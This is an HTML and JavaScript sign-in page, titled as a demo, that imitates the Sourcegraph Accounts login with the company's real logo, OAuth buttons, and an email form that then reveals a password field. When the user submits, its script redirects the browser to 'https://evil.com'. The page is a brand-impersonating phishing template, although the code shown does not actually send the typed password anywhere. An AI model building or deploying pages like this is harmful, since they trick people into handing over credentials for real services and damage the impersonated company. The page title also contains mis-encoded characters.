<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Sign in ‚Äî Demo</title>
<style>
  :root{
    --bg:#ffffff;
    --page:#fafafa;
    --card:#fff;
    --muted:#7b8596;
    --accent:#0b69ff;
    --border:#e6e9ee;
    --radius:8px;
    font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
  }

  html,body{height:100%;margin:0;background:var(--page);color:#0f1724}
  .wrap{
    min-height:100%;
    display:flex;
    align-items:flex-start;
    justify-content:center;
    padding:60px 24px;
    box-sizing:border-box;
  }

  .card{
    width:100%;
    max-width:520px;
    background:var(--card);
    border-radius:12px;
    padding:36px 48px;
    box-shadow:0 8px 30px rgba(15,23,42,.06);
    box-sizing:border-box;
    text-align:center;
  }

  /* header */
  .brand{
    display:flex;
    align-items:center;
    justify-content:center;
    gap:12px;
    margin-bottom:18px;
  }
  .logo-blob{
    width:36px;height:36px;border-radius:8px;
    background:linear-gradient(135deg,#ff6b4a,#ff8f6b);
    box-shadow:0 2px 6px rgba(16,24,40,.08);
  }
  .brand h2{margin:0;font-size:22px;font-weight:700;letter-spacing:-0.2px}
  .subtitle{color:var(--muted);margin:6px 0 22px;font-size:18px}

  /* oauth buttons */
  .oauth-list{display:flex;flex-direction:column;gap:14px;align-items:stretch;margin:6px 0 18px}
  .btn{
    display:flex;align-items:center;gap:12px;padding:12px 16px;border-radius:8px;
    border:1px solid var(--border);background:#fff;font-weight:600;font-size:15px;cursor:pointer;
    justify-content:center;
  }
  .btn svg{width:20px;height:20px;flex-shrink:0;opacity:.95}
  .btn .label{flex:1;text-align:left}

  /* divider */
  .divider{display:flex;align-items:center;margin:18px 0;color:var(--muted);font-size:13px}
  .divider:before,.divider:after{content:"";height:1px;background:var(--border);flex:1;margin:0 12px}

  /* email form */
  .form{display:grid;gap:12px;align-items:start;margin-top:6px}
  .field{
    display:flex;align-items:center;gap:10px;padding:12px;border-radius:10px;border:1px solid var(--border);
    background:#fff;font-size:15px;
  }
  .field svg{opacity:.6}
  input[type="email"]{
    border:0;outline:0;width:100%;font-size:15px;background:transparent;
  }
  .submit{
    padding:12px;border-radius:10px;border:0;background:rgba(11,105,255,.12);color:var(--accent);
    font-weight:700;cursor:pointer;
  }
  .submit.disabled{opacity:.45;cursor:default;color:var(--muted);background:#fff;border:1px solid var(--border)}

  .legal{margin-top:18px;font-size:13px;color:var(--muted);text-align:left;line-height:1.4}
  .legal a{color:var(--accent);text-decoration:none}

  /* small helper */
  .help{display:flex;gap:8px;align-items:center;margin-top:10px;color:var(--muted);font-size:13px}
  .help svg{opacity:.7}

  /* responsive */
  @media (max-width:520px){
    .card{padding:24px}
    .brand h2{font-size:18px}
    .subtitle{font-size:16px}
  }
  .footer {
  position: fixed;      /* Fix it at the bottom */
  bottom: 0;
  left: 0;
  width: 100%;
  background: var(--page);   /* Matches page background */
  text-align: center;
  padding: 12px 0;
  font-size: 13px;
  color: #9ca3af;            /* Subtle gray */
  box-shadow: 0 -2px 6px rgba(0,0,0,0.05); /* Optional shadow */
  z-index: 10;
}

</style>
</head>
<body>
  <div class="wrap">
    <div class="card" role="main" aria-labelledby="signin-heading">
      <div class="brand" aria-hidden="true">
        <img src="https://accounts.sourcegraph.com/img/sourcegraph-logo-light.svg" width="250" class="mx-auto">
      </div>

      <div class="subtitle">Sign in to Sourcegraph Accounts</div>

<div class="oauth-list" aria-hidden="false">
  <!-- Google -->
<button class="btn" type="button">
  <span class="ico" style="display:inline-block;width:20px;height:20px;border-radius:50%;overflow:hidden;">
    <img src="google-icon-logo-svgrepo-com.svg" alt="Google logo" style="width:100%;height:100%;object-fit:cover;">
  </span>
  <span class="label">Continue with Google</span>
</button>


  <!-- GitHub -->
<button class="btn" type="button">
  <span class="ico" style="display:inline-block;width:20px;height:20px;border-radius:50%;overflow:hidden;">
    <img src="github-142-svgrepo-com.svg" alt="GitHub logo" style="width:100%;height:100%;object-fit:cover;">
  </span>
  <span class="label">Continue with GitHub</span>
</button>


  <!-- GitLab -->
 <button class="btn" type="button">
  <span class="ico" style="display:inline-block;width:20px;height:20px;border-radius:50%;overflow:hidden;">
    <img src="gitlab-svgrepo-com.svg" alt="GitLab logo" style="width:100%;height:100%;object-fit:cover;">
  </span>
  <span class="label">Continue with GitLab</span>
</button>



      <div class="divider" aria-hidden="true">Or</div>

     <form class="form" id="emailForm" onsubmit="event.preventDefault(); showPasswordField()">
  <label class="field" for="email">
    <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="2" y="5" width="20" height="14" rx="3" stroke="#cbd5e1" stroke-width="1.5"/>
      <path d="M3 7l9 6 9-6" stroke="#cbd5e1" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
    <input id="email" type="email" placeholder="Enter your email address" aria-label="Email address" required>
  </label>

  <!-- Password field initially hidden -->
<!-- Password field initially hidden -->
<label class="field" for="password" id="passwordField" style="display:none;">
  <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M6 10V7a6 6 0 1 1 12 0v3" stroke="#cbd5e1" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
    <rect x="5" y="10" width="14" height="10" rx="2" stroke="#cbd5e1" stroke-width="1.5"/>
  </svg>
  <input id="password" type="password" placeholder="Enter your password" aria-label="Password" required>
</label>



  <button id="emailContinue" class="submit disabled" type="submit" disabled>Continue with email</button>
</form>


      <div class="legal">
        By continuing with any option, you agree to Sourcegraph <a href="https://about.sourcegraph.com/terms" onclick="event.preventDefault()">Terms of Service</a> and <a href="https://about.sourcegraph.com/terms/privacy" onclick="event.preventDefault()">Privacy Policy</a>.
      </div>

      <div class="help">
        <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true" fill="none" xmlns="http://www.w3.org/2000/svg">
          <circle cx="12" cy="12" r="10" stroke="#cbd5e1" stroke-width="1.5"/><path d="M11 10h1v4" stroke="#cbd5e1" stroke-width="1.5" stroke-linecap="round"/><path d="M12 7h.01" stroke="#cbd5e1" stroke-width="1.5" stroke-linecap="round"/>
        </svg>
        <div>What is<a href="https://sourcegraph.com/docs/sourcegraph-accounts" onclick="event.preventDefault()"> Sourcegraph Accounts?</a></div>
      </div>
    </div>
  </div>
<footer class="footer">

</footer>



<script>
const email = document.getElementById('email');
const cont = document.getElementById('emailContinue');
const passwordField = document.getElementById('passwordField');
const passwordInput = document.getElementById('password');

function checkEmail() {
  const val = email.value.trim();
  const ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
  cont.disabled = !ok;
  cont.classList.toggle('disabled', !ok);
}

email.addEventListener('input', checkEmail);
checkEmail();

cont.addEventListener('click', () => {
  if (passwordField.style.display === 'none') {
    // Show password field
    passwordField.style.display = 'flex';
    passwordField.scrollIntoView({behavior: 'smooth'}); 
    cont.textContent = 'Submit';
    cont.disabled = true;

    // Enable submit button when password is typed
    passwordInput.addEventListener('input', () => {
      cont.disabled = passwordInput.value.trim() === '';
    });
  } else {
    // Redirect after clicking submit
    window.location.href = "https://evil.com";
  }
});




</script>
</body>
</html>
